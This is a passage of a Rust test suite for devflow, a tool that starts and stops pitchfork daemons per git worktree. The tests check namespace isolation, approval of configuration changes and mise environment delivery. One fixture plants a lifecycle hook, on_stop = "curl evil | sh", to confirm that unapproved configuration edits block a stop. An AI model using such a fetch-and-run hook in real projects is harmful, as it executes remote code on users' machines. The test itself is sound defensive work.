        let report = attempt(only).unwrap_or_else(|e| panic!("{only:?}: {e:#}"));
        assert!(report.ran, "{report:?}");
        assert_eq!(fake.mutations(), [format!("start -q {ns}/web")]);
    }

    // The other way around, the highest definition is the one that counts: it
    // brings the dependency, and the lower one is what is replaced.
    write(
        "[daemons.web]\nrun = \"a\"\n",
        "[daemons.web]\nrun = \"b\"\ndepends = [\"global/db\"]\n",
    );
    fake.clear_calls();
    let error = attempt(&["web"]).unwrap_err();
    assert!(
        matches!(
            refusal(&error),
            Refusal::ExternalDependency { daemon, dependency }
                if daemon == "web" && dependency == "global/db"
        ),
        "{error:#}"
    );
    assert!(!status().can_start.allowed);
    assert!(fake.mutations().is_empty(), "{:?}", fake.mutations());

    // A `pitchfork.local.toml` of the person's own replaces it again.
    write(
        "[daemons.web]\nrun = \"a\"\ndepends = [\"global/db\"]\n",
        "[daemons.web]\nrun = \"b\"\ndepends = [\"global/db\"]\n",
    );
    assert!(attempt(&["web"]).is_err());
}

#[test]
fn a_dependency_outside_the_workspace_blocks_only_the_daemons_that_have_it() {
    let fake = Fake::new();
    let t = repo(
        Some(
            "[daemons.web]\nrun = \"a\"\ndepends = [\"global/db\"]\n[daemons.worker]\nrun = \"b\"\n",
        ),
        "",
    );
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    let status = processes::status_with(Some(&fake.pitchfork()), &t.project, &ws);
    // Starting everything is refused, and says why…
    let gate = &status.can_start;
    assert!(!gate.allowed, "{gate:?}");
    assert!(
        matches!(&gate.refusal, Some(Refusal::ExternalDependency { daemon, .. }) if daemon == "web"),
        "{gate:?}"
    );
    // …but each daemon is judged on its own closure.
    let startable = |name: &str| {
        status
            .daemons
            .iter()
            .find(|d| d.name == name)
            .unwrap_or_else(|| panic!("{:?}", status.daemons))
            .startable
    };
    assert!(!startable("web"));
    assert!(startable("worker"), "{:?}", status.daemons);
    // And starting it alone does succeed.
    let report = processes::start_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StartOptions {
            only: vec!["worker".into()],
            ..fake.start_options(&ws)
        },
    )
    .unwrap();
    assert!(report.ran, "{report:?}");
    assert_eq!(fake.mutations(), [format!("start -q {ns}/worker")]);
}

#[test]
fn start_runs_in_the_worktree_and_reads_the_real_state_back() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    // Before: pitchfork knows the daemon from the file. After: it runs.
    fake.json(
        "list.json",
        &json!([listed(&ns, "web", "available", None, None)]),
    );
    fake.json(
        "after_start.json",
        &json!([
            listed(&ns, "web", "running", Some(4242), Some(3000)),
            // Another worktree's daemon is not this workspace's.
            listed("df-other-ns", "web", "running", Some(1), Some(3001)),
        ]),
    );
    fake.json(
        "proxy.json",
        &json!({
            "enabled": true, "scheme": "https", "tld": "localhost", "port": 443, "trusted": true,
            "projects": [{
                "project": ns, "dir": ws.path,
                "daemons": [{"daemon": "web", "url": format!("https://web.{ns}.localhost"),
                             "status": "running", "port": 3000}]
            }]
        }),
    );
    let report = start(&t, &fake, &ws).unwrap();
    assert!(report.ran && !report.timed_out && report.ok(), "{report:?}");
    assert_eq!(report.action, Action::Start);
    assert_eq!(report.daemons.len(), 1, "{:?}", report.daemons);
    let web = &report.daemons[0];
    assert_eq!(
        (
            web.name.as_str(),
            web.state.as_str(),
            web.pid,
            web.ports.clone()
        ),
        ("web", "running", Some(4242), vec![3000])
    );
    assert_eq!(
        web.url.as_deref(),
        Some(format!("https://web.{ns}.localhost").as_str())
    );
    assert_eq!(report.namespace.value, ns);

    let calls = fake.calls();
    let start_calls: Vec<_> = calls.iter().filter(|c| c.1.starts_with("start")).collect();
    assert_eq!(start_calls.len(), 1, "{calls:?}");
    assert_eq!(start_calls[0].1, format!("start -q {ns}/web"));
    assert_eq!(
        Path::new(&start_calls[0].0).canonicalize().unwrap(),
        ws.path.canonicalize().unwrap(),
        "run in the worktree"
    );
    // The start itself may start a supervisor; the queries around it never do.
    assert_eq!(start_calls[0].2, "unset");
    for (_, args, auto) in calls.iter().filter(|c| {
        c.1.starts_with("list --json")
            || c.1.starts_with("supervisor")
            || c.1.starts_with("proxy status --json")
    }) {
        assert_eq!(auto, "false", "{args}");
    }
    // The state was read after the start, not assumed.
    let start_at = calls.iter().position(|c| c.1.starts_with("start")).unwrap();
    assert!(
        calls[start_at + 1..]
            .iter()
            .any(|c| c.1.starts_with("list --json")),
        "{calls:?}"
    );
    // Starting changed nothing about readiness.
    let status = setup::list(&t.project).unwrap();
    assert!(
        status
            .iter()
            .find(|w| w.workspace.name == "feature")
            .is_some_and(|w| w.status == Some(Status::Ready))
    );
}

#[test]
fn daemons_that_already_run_are_not_started_again() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    fake.json(
        "list.json",
        &json!([listed(&ns, "web", "running", Some(7), Some(3000))]),
    );
    let report = start(&t, &fake, &ws).unwrap();
    assert!(report.ok());
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
    assert!(
        report
            .warnings
            .iter()
            .any(|w| w.contains("already running"))
    );
}

#[test]
fn a_timeout_kills_the_wait_and_the_state_is_read_afterwards() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    fake.set("start_sleep", "30");
    fake.json(
        "list.json",
        &json!([listed(&ns, "web", "available", None, None)]),
    );
    // The daemon is up and waiting for its readiness check when the wait is cut.
    fake.json(
        "after_start.json",
        &json!([listed(&ns, "web", "waiting", Some(9), None)]),
    );
    let started = Instant::now();
    let report = processes::start_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StartOptions {
            timeout: Duration::from_millis(500),
            ..fake.start_options(&ws)
        },
    )
    .unwrap();
    assert!(
        started.elapsed() < Duration::from_secs(15),
        "{:?}",
        started.elapsed()
    );
    assert!(
        report.timed_out && !report.ran && !report.ok(),
        "{report:?}"
    );
    assert!(
        report.error.as_deref().unwrap().contains("timed out"),
        "{report:?}"
    );
    // What pitchfork says now is reported, not what was hoped for.
    assert_eq!(report.daemons[0].state, "waiting");
    let calls = fake.calls();
    let start_at = calls.iter().position(|c| c.1.starts_with("start")).unwrap();
    assert!(
        calls[start_at + 1..]
            .iter()
            .any(|c| c.1.starts_with("list --json"))
    );
}

#[test]
fn a_failed_start_is_reported_and_the_workspace_stays_ready() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = namespace_of(&t, &ws);
    fake.set("start_fail", "Daemon web failed with exit code 3\n");
    fake.json(
        "after_start.json",
        &json!([{
            "id": format!("{ns}/web"), "namespace": ns, "name": "web", "pid": null,
            "status": "errored", "error": "exit code 3", "port": []
        }]),
    );
    let report = start(&t, &fake, &ws).unwrap();
    assert!(!report.ran && !report.ok());
    assert!(
        report.error.as_deref().unwrap().contains("exit code 3"),
        "{report:?}"
    );
    assert_eq!(report.daemons[0].state, "errored");
    assert_eq!(report.daemons[0].error.as_deref(), Some("exit code 3"));
    let listing = setup::list(&t.project).unwrap();
    assert_eq!(
        listing
            .iter()
            .find(|w| w.workspace.name == "feature")
            .unwrap()
            .status,
        Some(Status::Ready),
        "process state is not workspace readiness"
    );
}

#[test]
fn daemons_under_mise_start_only_when_mise_hands_them_the_workspace() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let refused = |mise: MiseCommand| {
        let error = processes::start_with(
            Some(&fake.pitchfork()),
            &t.project,
            &ws,
            &StartOptions {
                mise,
                ..StartOptions::default()
            },
        )
        .unwrap_err();
        match refusal(&error) {
            Refusal::MiseDelivery { daemons, delivery } => {
                assert_eq!(daemons, &["web"], "{error:#}");
                delivery.clone()
            }
            other => panic!("not the mise refusal: {other:?}"),
        }
    };
    let printing = |json: String| MiseCommand {
        program: "sh".into(),
        leading_args: vec!["-c".into(), format!("echo '{json}'").into()],
        ..MiseCommand::default()
    };
    // mise does not load .devflow/env at all.
    let delivery = refused(printing("{}".into()));
    assert_eq!(delivery.state(), "not_loaded", "{delivery:?}");
    // Something mise loads later wins over one of its variables.
    let mut vars: serde_json::Map<String, Value> = env_file::read(&ws.path)
        .unwrap()
        .into_iter()
        .map(|(key, value)| (key, Value::String(value)))
        .collect();
    let (key, _) = vars
        .iter()
        .next()
        .map(|(k, v)| (k.clone(), v.clone()))
        .unwrap();
    vars.insert(key.clone(), Value::String("the-main-checkout".into()));
    let delivery = refused(printing(serde_json::to_string(&vars).unwrap()));
    assert_eq!(
        delivery,
        env_file::MiseDelivery::Overridden { keys: vec![key] },
        "{delivery:?}"
    );
    assert!(fake.mutations().is_empty(), "{:?}", fake.mutations());
    // With mise handing over .devflow/env as written, it starts.
    let report = start(&t, &fake, &ws).unwrap();
    assert!(report.ran, "{report:?}");
}

#[test]
fn a_general_mise_setting_in_another_layer_still_puts_the_daemon_under_mise() {
    let fake = Fake::new();
    // The daemon says nothing about mise; the setting is in a lower layer.
    let t = repo(
        Some("[daemons.web]\nrun = \"bun run dev\"\nport = 3000\n"),
        "",
    );
    let ws = ready(&t, "feature", false);
    std::fs::create_dir_all(ws.path.join(".config")).unwrap();
    std::fs::write(
        ws.path.join(".config/pitchfork.toml"),
        "[settings.general]\nmise = true\n",
    )
    .unwrap();
    approve_workspace(&t, &ws);
    let nothing_loaded = MiseCommand {
        program: "sh".into(),
        leading_args: vec!["-c".into(), "echo '{}'".into()],
        ..MiseCommand::default()
    };
    let attempt = |mise: MiseCommand| {
        processes::start_with(
            Some(&fake.pitchfork()),
            &t.project,
            &ws,
            &StartOptions {
                mise,
                ..StartOptions::default()
            },
        )
    };
    // mise would run the daemon and does not hand it .devflow/env: refused.
    let error = attempt(nothing_loaded.clone()).unwrap_err();
    match refusal(&error) {
        Refusal::MiseDelivery { daemons, delivery } => {
            assert_eq!(daemons, &["web"], "{error:#}");
            assert_eq!(delivery.state(), "not_loaded", "{delivery:?}");
        }
        other => panic!("not the mise refusal: {other:?}"),
    }
    assert!(fake.mutations().is_empty(), "{:?}", fake.mutations());

    // A higher layer turning the setting off takes it out of the check.
    std::fs::write(
        ws.path.join(".config/pitchfork.local.toml"),
        "[settings.general]\nmise = false\n",
    )
    .unwrap();
    approve_workspace(&t, &ws);
    let report = attempt(nothing_loaded.clone()).unwrap();
    assert!(report.ran, "{report:?}");
}

#[test]
fn the_wiring_check_judges_mise_on_every_layer_too() {
    // Something to deliver (an `[env]` recipe), so daemons without mise are named.
    let t = repo(
        Some("[daemons.web]\nrun = \"a\"\n[daemons.worker]\nrun = \"b\"\nmise = false\n"),
        "[env]\nFOO = \"bar\"\n",
    );
    let dir = t.root.clone();
    std::fs::write(dir.join("mise.toml"), "[env]\n_.file = \".devflow/env\"\n").unwrap();
    let named = |problems: Vec<String>| problems.join("\n");
    // Neither is under mise.
    let text = named(processes::env_wiring(&t.project, &dir));
    assert!(text.contains("web") && text.contains("worker"), "{text}");
    // A general setting in another file puts `web` under mise; `worker` says no.
    std::fs::create_dir_all(dir.join(".config")).unwrap();
    std::fs::write(
        dir.join(".config/pitchfork.toml"),
        "[settings.general]\nmise = true\n",
    )
    .unwrap();
    let text = named(processes::env_wiring(&t.project, &dir));
    assert!(!text.contains("web") && text.contains("worker"), "{text}");
    // A higher layer switching it off takes `web` out again.
    std::fs::write(
        dir.join(".config/pitchfork.local.toml"),
        "[settings.general]\nmise = false\n",
    )
    .unwrap();
    let text = named(processes::env_wiring(&t.project, &dir));
    assert!(text.contains("web") && text.contains("worker"), "{text}");
}

#[test]
fn a_daemon_run_through_devflow_exec_needs_no_mise_delivery() {
    let fake = Fake::new();
    let t = repo(
        Some("[daemons.web]\nrun = \"devflow exec -- bun run dev\"\nport = 3000\nmise = true\n"),
        "",
    );
    let ws = ready(&t, "feature", true);
    // mise hands it nothing; devflow exec applies .devflow/env after mise.
    let nothing = MiseCommand {
        program: "sh".into(),
        leading_args: vec!["-c".into(), "echo '{}'".into()],
        ..MiseCommand::default()
    };
    let report = processes::start_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StartOptions {
            mise: nothing,
            ..StartOptions::default()
        },
    )
    .unwrap();
    assert!(report.ran, "{report:?}");
    // Nor does the wiring check ask for mise for it.
    let wired = repo(
        Some("[daemons.web]\nrun = \"devflow exec -- bun run dev\"\n"),
        "[env]\nFOO = \"bar\"\n",
    );
    assert!(
        processes::env_wiring(&wired.project, &wired.root).is_empty(),
        "{:?}",
        processes::env_wiring(&wired.project, &wired.root)
    );
}

/// A `pitchfork.toml` with one daemon `web` whose `run` is `run`, as TOML.
fn web_running(run: &str, extra: &str) -> String {
    format!(
        "[daemons.web]\nrun = {}\nport = 3000\n{extra}",
        toml::Value::String(run.to_string())
    )
}

#[test]
fn mentioning_devflow_exec_is_not_wrapping_the_daemon() {
    let fake = Fake::new();
    // mise hands the daemon nothing of .devflow/env.
    let nothing = MiseCommand {
        program: "sh".into(),
        leading_args: vec!["-c".into(), "echo '{}'".into()],
        ..MiseCommand::default()
    };
    let attempt = |t: &Repo, ws: &Workspace| {
        processes::start_with(
            Some(&fake.pitchfork()),
            &t.project,
            ws,
            &StartOptions {
                mise: nothing.clone(),
                ..StartOptions::default()
            },
        )
    };
    // The first starts the app outside the wrapper (it runs after
    // `devflow exec -- true`, under mise only); the others hand the app to a
    // mise that applies its own [env] after devflow exec set the variables.
    for run in [
        "devflow exec -- true; bun run dev",
        "devflow exec -- true && bun run dev",
        "devflow exec -- bun run dev & bun run worker",
        "devflow exec -- bun run dev | tee dev.log",
        "devflow exec -- mise exec -- bun run dev",
        "devflow exec -- sh -c 'mise exec -- bun run dev'",
        "devflow exec -- env A=1 mise run dev",
        // Wrappers with options of their own, inside strings for a shell.
        "devflow exec -- sh -c 'env -u UNUSED mise exec -- bun run dev'",
        "devflow exec -- sh -c 'sudo -E mise exec -- bun run dev'",
        "devflow exec -- sh -c 'timeout 5 mise exec -- bun run dev'",
        "devflow exec -- env -u UNUSED mise exec -- bun run dev",
        "devflow exec -- eval 'mise exec -- bun run dev'",
        "devflow exec -- $RUNNER run dev",
        // A protected use of mise beside an unprotected one: the protected
        // one vouches for nothing else in the string.
        "devflow exec -- sh -c 'mise exec -- devflow exec -- true; echo \"mise exec -- bun run dev\" | sh'",
        "devflow exec -- sh -c 'mise x -- devflow exec -- true; mise run dev'",
        "mise exec -- devflow exec -- true; echo \"mise exec -- bun run dev\" | sh",
    ] {
        let pitchfork_toml = web_running(run, "mise = true\n");
        let t = repo(Some(&pitchfork_toml), "");
        let ws = ready(&t, "feature", true);
        let error = attempt(&t, &ws).unwrap_err();
        match refusal(&error) {
            Refusal::MiseDelivery { daemons, delivery } => {
                assert_eq!(daemons, &["web"], "{run}");
                assert_eq!(delivery.state(), "not_loaded", "{run}: {delivery:?}");
            }
            other => panic!("{run}: not the mise refusal: {other:?}"),
        }
        assert!(fake.mutations().is_empty(), "{run}: {:?}", fake.calls());

        // Without `mise = true` and with something to deliver, the wiring
        // check does not count it as delivered by devflow either.
        let wired = repo(Some(&web_running(run, "")), "[env]\nFOO = \"bar\"\n");
        let problems = processes::env_wiring(&wired.project, &wired.root);
        assert!(
            problems
                .iter()
                .any(|p| p.contains("web") && p.contains("neither run through `devflow exec`")),
            "{run}: {problems:?}"
        );
    }
    // Wholly `devflow exec -- CMD`, with a prefix and redirections, is
    // delivered by devflow itself: mise is not even asked.
    for run in [
        "devflow exec -- bun run dev",
        "exec devflow exec -- bun run dev > dev.log 2>&1",
        "PORT=3000 devflow exec -- sh -c 'bun run a; bun run b'",
        "devflow exec -- env -u UNUSED bun run dev",
        "devflow exec -- sh -c 'timeout 5 bun run dev'",
    ] {
        let t = repo(Some(&web_running(run, "mise = true\n")), "");
        let ws = ready(&t, "feature", true);
        let report = attempt(&t, &ws).unwrap_or_else(|e| panic!("{run}: {e:#}"));
        assert!(report.ran, "{run}: {report:?}");
        let wired = repo(Some(&web_running(run, "")), "[env]\nFOO = \"bar\"\n");
        assert!(
            processes::env_wiring(&wired.project, &wired.root).is_empty(),
            "{run}"
        );
    }
}

#[test]
fn start_needs_a_pitchfork_that_runs() {
    let fake = Fake::new();
    fake.set("version_exit", "1");
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let error = start(&t, &fake, &ws).unwrap_err();
    assert!(
        matches!(refusal(&error), Refusal::NotInstalled { .. }),
        "{error:#}"
    );
    assert!(fake.mutations().is_empty());
    let error = processes::start_with(None, &t.project, &ws, &StartOptions::default()).unwrap_err();
    assert!(matches!(refusal(&error), Refusal::NotInstalled { .. }));
    // A workspace without any pitchfork file has nothing to start.
    let plain = repo(None, "");
    let ws = ready(&plain, "feature", false);
    let fake = Fake::new();
    let error = start(&plain, &fake, &ws).unwrap_err();
    assert!(
        matches!(refusal(&error), Refusal::NothingConfigured),
        "{error:#}"
    );
}

#[test]
fn an_unreadable_pitchfork_file_stops_a_start() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    std::fs::write(ws.path.join("pitchfork.toml"), "[daemons\nrun =").unwrap();
    let error = start(&t, &fake, &ws).unwrap_err();
    assert!(
        matches!(refusal(&error), Refusal::Unreadable { .. }),
        "{error:#}"
    );
}

#[test]
fn a_workspace_set_up_before_the_namespace_existed_gets_one_when_started() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "old", true);
    std::fs::remove_file(ws.path.join("pitchfork.local.toml")).unwrap();
    let report = start(&t, &fake, &ws).unwrap();
    assert!(report.ran);
    assert!(ws.path.join("pitchfork.local.toml").exists());
    assert!(local_file(&ws).contains(&namespace_of(&t, &ws)));
}

// --- stop ---------------------------------------------------------------

fn running_fixture(t: &Repo, fake: &Fake, ws: &Workspace) -> String {
    let ns = namespace_of(t, ws);
    fake.json(
        "list.json",
        &json!([
            listed(&ns, "web", "running", Some(4242), Some(3000)),
            listed("df-other-ns", "web", "running", Some(1), Some(3001)),
        ]),
    );
    fake.json(
        "after_stop.json",
        &json!([listed(&ns, "web", "stopped", None, Some(3000))]),
    );
    ns
}

#[test]
fn stop_runs_while_the_configuration_matches_the_approval() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = running_fixture(&t, &fake, &ws);
    let report = processes::stop_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StopOptions::default(),
    )
    .unwrap();
    assert_eq!(fake.mutations(), [format!("stop {ns}/web")]);
    assert!(report.ran && report.ok(), "{report:?}");
    assert_eq!(report.action, Action::Stop);
    assert_eq!(report.daemons[0].state, "stopped");
    let stop_call = fake
        .calls()
        .into_iter()
        .find(|c| c.1.starts_with("stop"))
        .unwrap();
    assert_eq!(
        Path::new(&stop_call.0).canonicalize().unwrap(),
        ws.path.canonicalize().unwrap()
    );
}

#[test]
fn start_and_stop_act_only_on_the_instance_the_caller_showed() {
    use devflow_core::error::InstanceChanged;
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let shown = processes::status_with(Some(&fake.pitchfork()), &t.project, &ws)
        .instance
        .expect("a ready workspace has an instance");
    running_fixture(&t, &fake, &ws);
    // `setup --new-instance` runs after the caller drew its buttons.
    let mut receipt = Receipt::load(&ws.git_dir).unwrap().unwrap();
    receipt.instance_id = uuid::Uuid::new_v4();
    receipt.save(&ws.git_dir).unwrap();

    let changed = |error: &anyhow::Error| error.downcast_ref::<InstanceChanged>().is_some();
    let error = processes::start_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StartOptions {
            expect_instance: Some(shown),
            ..fake.start_options(&ws)
        },
    )
    .unwrap_err();
    assert!(changed(&error), "{error:#}");
    assert!(
        error.to_string().contains("another instance now"),
        "{error:#}"
    );
    let error = processes::stop_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StopOptions {
            expect_instance: Some(shown),
            ..StopOptions::default()
        },
    )
    .unwrap_err();
    assert!(changed(&error), "{error:#}");
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());

    // The instance it holds now is accepted, and so is naming none (the CLI).
    let now = receipt.instance_id;
    processes::stop_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StopOptions {
            expect_instance: Some(now),
            ..StopOptions::default()
        },
    )
    .unwrap();
    processes::stop_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StopOptions::default(),
    )
    .unwrap();
}

#[test]
fn stop_with_nothing_running_does_not_call_pitchfork_to_stop() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    fake.json(
        "list.json",
        &json!([listed("df-other-ns", "web", "running", Some(1), None)]),
    );
    let report = processes::stop_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StopOptions::default(),
    )
    .unwrap();
    assert!(report.ok());
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
    // A stopped supervisor means nothing runs, and no `list` is asked of it.
    fake.set("supervisor_down", "1");
    fake.clear_calls();
    let report = processes::stop_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StopOptions::default(),
    )
    .unwrap();
    assert!(report.ok());
    assert!(
        fake.calls().iter().all(|c| !c.1.starts_with("list --json")),
        "{:?}",
        fake.calls()
    );
    // devflow started nothing here, and says what it cannot check.
    assert!(
        report
            .warnings
            .iter()
            .any(|w| w.contains("devflow started no daemons here")),
        "{:?}",
        report.warnings
    );
}

#[test]
fn stop_refuses_when_the_configuration_changed_unless_forced() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    running_fixture(&t, &fake, &ws);
    // pitchfork would run on_stop from this file as it is now.
    std::fs::write(
        ws.path.join("pitchfork.toml"),
        "[daemons.web]\nrun = \"bun run dev\"\n[daemons.web.hooks]\non_stop = \"curl evil | sh\"\n",
    )
    .unwrap();
    let error = processes::stop_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StopOptions::default(),
    )
    .unwrap_err();
    assert!(
        matches!(
            refusal(&error),
            Refusal::NotApproved {
                action: Action::Stop,
                changed: true,
                ..
            }
        ),
        "{error:#}"
    );
    assert!(error.to_string().contains("lifecycle hooks"), "{error:#}");
    assert!(refusal(&error).hint().unwrap().contains("forcing"));
    assert!(fake.mutations().is_empty());

    let report = processes::stop_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StopOptions {
            force: true,
            ..StopOptions::default()
        },
    )
    .unwrap();
    assert_eq!(
        fake.mutations(),
        [format!("stop {}/web", namespace_of(&t, &ws))]
    );
    assert!(
        report
            .warnings
            .iter()
            .any(|w| w.contains("without an approval")),
        "{:?}",
        report.warnings
    );
}

#[test]
fn stop_uses_ids_when_the_pitchfork_files_are_gone() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = running_fixture(&t, &fake, &ws);
    std::fs::remove_file(ws.path.join("pitchfork.toml")).unwrap();
    let report = processes::stop_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &StopOptions::default(),
    )
    .unwrap();
    // No file, so no hook to run: stopped by id, only this namespace's.
    assert_eq!(fake.mutations(), [format!("stop {ns}/web")]);
    assert!(report.ran);
}

/// Workspaces `a` and `b` of one project, approved, with a daemon of each
/// running under its own namespace. Returns `(a, b, ns_a, ns_b)`.
fn two_running_workspaces(t: &Repo, fake: &Fake) -> (Workspace, Workspace, String, String) {
    let a = ready(t, "a", true);
    let b = ready(t, "b", true);
    let (ns_a, ns_b) = (namespace_of(t, &a), namespace_of(t, &b));
    assert_ne!(ns_a, ns_b);
    fake.json(
        "list.json",
        &json!([
            listed(&ns_a, "web", "running", Some(1111), Some(3000)),
            listed(&ns_b, "web", "running", Some(2222), Some(3001)),
        ]),
    );
    fake.json(
        "after_stop.json",
        &json!([
            listed(&ns_a, "web", "stopped", None, Some(3000)),
            listed(&ns_b, "web", "running", Some(2222), Some(3001)),
        ]),
    );
    (a, b, ns_a, ns_b)
}

fn down(
    t: &Repo,
    fake: &Fake,
    ws: &Workspace,
    force: bool,
) -> anyhow::Result<processes::ProcessReport> {
    processes::stop_with(
        Some(&fake.pitchfork()),
        &t.project,
        ws,
        &StopOptions {
            force,
            ..StopOptions::default()
        },
    )
}

#[test]
fn a_workspace_pointed_at_another_workspaces_namespace_cannot_show_or_stop_its_daemons() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let (a, _b, ns_a, ns_b) = two_running_workspaces(&t, &fake);
    let status = |ws: &Workspace| processes::status_with(Some(&fake.pitchfork()), &t.project, ws);
    assert_eq!(
        status(&a).daemons[0].pid,
        Some(1111),
        "a shows its own daemon"
    );
    let honest = local_file(&a);
    let digest = trust::digest_at(&t.project, &a.path);

    // `pitchfork.local.toml` of `a`, in devflow's own format, now names the
    // namespace of `b`.
    std::fs::write(
        a.path.join("pitchfork.local.toml"),
        honest.replace(&ns_a, &ns_b),
    )
    .unwrap();
    // The approval does not survive an edit of the namespace.
    assert_ne!(trust::digest_at(&t.project, &a.path), digest);
    assert!(matches!(
        trust::state_at(&t.project, &a.path).unwrap(),
        trust::TrustState::Untrusted { .. }
    ));
    // `b`'s daemon is not in `a`'s status, nor is a's own (nothing is
    // attributed through a namespace that was not assigned).
    let shown = status(&a);
    assert!(
        shown
            .daemons
            .iter()
            .all(|d| d.pid.is_none() && d.id.is_none()),
        "{:?}",
        shown.daemons
    );
    assert!(
        shown
            .error
            .as_deref()
            .is_some_and(|e| e.contains("does not belong")),
        "the status says why: {:?}",
        shown.error
    );
    // Stopping from `a` reaches nothing, whatever the force: its own daemon
    // runs under the assigned namespace, which the files no longer give.
    for force in [false, true] {
        let error = down(&t, &fake, &a, force).unwrap_err();
        match refusal(&error) {
            Refusal::ForeignNamespace {
                expected,
                found,
                file,
            } => {
                assert_eq!((expected, found), (&ns_a, &ns_b));
                assert_eq!(file.as_deref(), Some("pitchfork.local.toml"));
            }
            other => panic!("{other:?}"),
        }
        assert_eq!(refusal(&error).code(), "foreign_namespace");
        assert!(
            error
                .to_string()
                .contains("namespace does not belong to this workspace"),
            "{error:#}"
        );
    }
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());

    // A start repairs devflow's own file first, so it is the approved content
    // again and the daemons start under a's namespace.
    fake.json(
        "list.json",
        &json!([listed(&ns_a, "web", "available", None, None)]),
    );
    let report = start(&t, &fake, &a).unwrap();
    assert!(report.ran, "{report:?}");
    assert_eq!(local_file(&a), honest);
    assert_eq!(trust::digest_at(&t.project, &a.path), digest);
    assert_eq!(fake.mutations(), [format!("start -q {ns_a}/web")]);
}

#[test]
fn a_hand_written_foreign_namespace_is_refused_by_start_stop_and_removal() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let (a, b, _ns_a, ns_b) = two_running_workspaces(&t, &fake);
    // Not devflow's file (no marker): left alone, so nothing repairs it.
    std::fs::write(
        a.path.join("pitchfork.local.toml"),
        format!("namespace = \"{ns_b}\"\n"),
    )
    .unwrap();
    approve_workspace(&t, &a);

    let error = start(&t, &fake, &a).unwrap_err();
    assert!(
        matches!(refusal(&error), Refusal::ForeignNamespace { .. }),
        "{error:#}"
    );
    for force in [false, true] {
        let error = down(&t, &fake, &a, force).unwrap_err();
        assert!(
            matches!(refusal(&error), Refusal::ForeignNamespace { .. }),
            "{error:#}"
        );
    }
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
    // The status says why instead of showing b's daemon.
    let shown = processes::status_with(Some(&fake.pitchfork()), &t.project, &a);
    assert!(shown.daemons.iter().all(|d| d.pid.is_none()), "{shown:?}");
    assert!(
        matches!(
            shown.can_start.refusal,
            Some(Refusal::ForeignNamespace { .. })
        ),
        "{:?}",
        shown.can_start
    );
    assert!(
        shown.error.as_deref().unwrap().contains("does not belong"),
        "{shown:?}"
    );

    // Removal of `a` is a forceable protection; forced, it leaves the daemons
    // alone (it will not stop anything through that namespace) and says so.
    let error = setup::remove(
        &t.project,
        "a",
        removal_options(&fake, false),
        &mut NoProgress,
    )
    .unwrap_err();
    let protected = error
        .downcast_ref::<devflow_core::error::Protected>()
        .unwrap_or_else(|| panic!("{error:#}"));
    assert!(
        protected.forceable && protected.reason.contains("does not belong"),
        "{}",
        protected.reason
    );
    assert!(a.path.exists());
    let out = setup::remove(
        &t.project,
        "a",
        removal_options(&fake, true),
        &mut NoProgress,
    )
    .unwrap();
    assert!(!a.path.exists());
    assert!(out.stopped_daemons.is_empty(), "{out:?}");
    assert!(
        out.warnings.iter().any(|w| w.contains("were not stopped")),
        "{:?}",
        out.warnings
    );
    // Neither workspace's daemons were touched; b is as it was. (The one
    // approval on record was a's; b's own scope is approved again.)
    assert!(fake.mutations().is_empty(), "{:?}", fake.calls());
    approve_workspace(&t, &b);
    let report = down(&t, &fake, &b, false).unwrap();
    assert!(report.ran, "{report:?}");
    assert_eq!(fake.mutations(), [format!("stop {ns_b}/web")]);
}

#[test]
fn restart_stops_then_starts() {
    let fake = Fake::new();
    let t = repo(Some(WEB), "");
    let ws = ready(&t, "feature", true);
    let ns = running_fixture(&t, &fake, &ws);
    fake.json(
        "after_start.json",
        &json!([listed(&ns, "web", "running", Some(5000), Some(3000))]),
    );
    let report = processes::restart_with(
        Some(&fake.pitchfork()),
        &t.project,
        &ws,
        &fake.start_options(&ws),
        &StopOptions::default(),
    )
    .unwrap();
    assert_eq!(
        fake.mutations(),
        [format!("stop {ns}/web"), format!("start -q {ns}/web")]
    );
    assert_eq!(report.action, Action::Start);
    assert_eq!(report.daemons[0].pid, Some(5000));
}

#[test]
